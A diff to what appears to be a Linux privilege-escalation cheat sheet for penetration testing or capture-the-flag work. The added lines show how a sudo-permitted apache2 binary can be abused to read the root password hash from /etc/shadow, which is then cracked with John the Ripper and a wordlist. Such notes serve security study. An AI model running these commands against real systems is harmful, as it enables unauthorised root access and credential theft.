@@ -88,7 +88,12 @@ run post/multi/recon/local_exploit_suggester
 sudo -l
 ```
 [Every-Tools-Shell-Escap](https://gtfobins.github.io/)
-
+#### If "/usr/sbin/apache2" existed. 🔆
+```bash
+sudo apache2 -f /etc/shadow # read line 1 (root-hash)
+echo '[Pasted Root Hash]' > hash.txt
+john --wordlist=/usr/share/wordlists/wordlist hash.txt
+```
 ### Environment Variables ✡️
 ```note
 Run "ldd" against the any program file to see which shared libraries are used by the program.
